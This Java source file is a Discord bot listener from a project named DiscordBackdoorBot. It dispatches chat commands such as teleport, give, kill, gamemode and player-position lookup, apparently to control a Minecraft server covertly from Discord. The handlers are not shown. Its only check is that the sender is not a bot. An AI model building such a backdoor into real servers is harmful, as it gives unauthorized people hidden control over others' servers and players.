package me.tsb.discordBot;

import me.tsb.discordBot.commands.*;
import me.tsb.discordBot.commands.BedPosition;
import me.tsb.discordBot.commands.HelpCommand;
import me.tsb.discordBot.commands.PlayerPosition;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.checkerframework.checker.units.qual.K;

public class PrefixListner extends ListenerAdapter {

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        String[] args = event.getMessage().getContentRaw().toLowerCase().split(" ");
        String command = args[0].replaceFirst(DiscordBackdoorBot.prefix, "").toLowerCase();
        if (command != "") {
            if (args[0].startsWith(DiscordBackdoorBot.prefix) && !event.getAuthor().isBot()) {
                switch (command) {
                    case "bedposition", "bp", "bedlocation", "bl" -> {
                        new BedPosition(event, args);
                    }
                    case "playerposition", "pp", "playerlocation", "pl" -> {
                        new PlayerPosition(event, args);
                    }
                    case "enchant", "ec" -> {
                        new EnchantCommand(event, args);
                    }
                    case "gamemode", "gm" -> {
                        new GamemodeCommand(event, args);
                    }
                    case "give", "g" -> {
                        new GiveCommand(event, args);
                    }
                    case "kill", "k" -> {
                        new KillCommand(event, args);
                    }
                    case "teleport", "tele", "tp" -> {
                        new TeleportCommand(event, args);
                    }
                    case "help", "h" -> {
                        new HelpCommand(event, args);
                    }
                }
            }
        }
    }
}
